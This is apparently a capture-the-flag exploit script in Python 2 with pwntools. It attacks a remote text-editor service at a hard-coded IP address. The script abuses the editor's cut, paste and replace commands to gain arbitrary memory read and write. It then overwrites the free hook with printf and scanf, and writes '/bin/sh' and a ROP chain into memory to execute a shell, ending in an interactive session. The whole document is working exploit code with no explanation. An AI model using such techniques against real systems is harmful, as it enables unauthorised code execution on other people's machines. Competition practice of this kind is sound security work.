#!/usr/bin/env python2
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

r = remote('13.230.132.4', 21700)
print r.recvline().strip()
print r.recvline().strip()
r.sendline(raw_input().strip())

r.recvuntil('>>> ')

def sendline(data):
    r.sendline(data)

def insert(index, text):
    sendline('i %d' % index)
    sendline(text)
    data = r.recvuntil('Done.', drop=True)
    r.recvuntil('>>> ')
    return data

def display(index, length):
    sendline('d %d %d' % (index, length))
    data = r.recvn(length)
    r.recvuntil('>>> ')
    return data

def cut(index, length):
    sendline('c %d %d' % (index, length))
    r.recvuntil('>>> ')

def new_tab():
    sendline('n')
    r.recvuntil('>>> ')

def select_tab(tab):
    sendline('s %d' % tab)
    r.recvuntil('>>> ')

def paste(tab, do_scanf=False):
    sendline('p %d' % tab)
    if do_scanf:
        return
    r.recvuntil('>>> ')

def replace(index, length, c):
    sendline('r %d %d' % (index, length))
    sendline(c)
    r.recvuntil('>>> ')

insert(0, 'A' * 0x18)
cut(0, 0x18)

new_tab() # 1

insert(0, 'B' * 0xff)
cut(1, 0x80)

new_tab() # 2
paste(0)

replace(0x40, 4, 'A')
replace(0x48, 1, '\0')

def set_addr(addr):
    select_tab(2)
    for i in xrange(8):
        replace(0x50 + i, 1, chr(addr & 0xff))
        addr >>= 8

def write(addr, data):
    set_addr(addr)
    select_tab(1)
    for i, c in enumerate(data):
        replace(i, 1, c)

def read(addr, length):
    set_addr(addr)
    select_tab(1)
    return display(0, length)

free_hook = 0x6D9E78
printf = 0x4109D0
scanf = 0x410B50
bss = 0x6D9900

def do_printf(fmt):
    write(free_hook, p(printf))
    new_tab()
    insert(0, fmt)
    return insert(0, 'x')

def do_scanf(fmt):
    new_tab()
    insert(0, fmt)
    cut(0, len(fmt))
    insert(0, 'A')
    write(free_hook, p(scanf))
    paste(0, do_scanf=True)

binsh = bss
write(binsh, '/bin/sh\0')

syscall = 0x40255c
pop_rax_ret = 0x4615d4
pop_rdi_ret = 0x4a748a
ret = 0x4a748b
pop_rdx_rsi_ret = 0x44d859
mov_rsi_rax_ret = 0x497af3

infloop = 0x4191d9

rop_buf = bss + 0x100
fake_editor = rop_buf
rop = [
    binsh,
    0,
    fake_editor,
    fake_editor,
    pop_rdx_rsi_ret,
    0,
    0x3b,
    mov_rsi_rax_ret,
    pop_rdi_ret,
    binsh,
    pop_rdx_rsi_ret,
    0,
    rop_buf,
    syscall,
]

print 'about to write rop (%d)' % len(rop)
for i, addr in enumerate(rop):
    print 'write:', i, hex(rop_buf + i * 8), hex(addr)
    write(rop_buf + i * 8, p(addr))

#print do_printf('%14$p')
do_scanf('%14$ld')
pause()
r.sendline(str(rop_buf + 0x18))

r.interactive(prompt='')
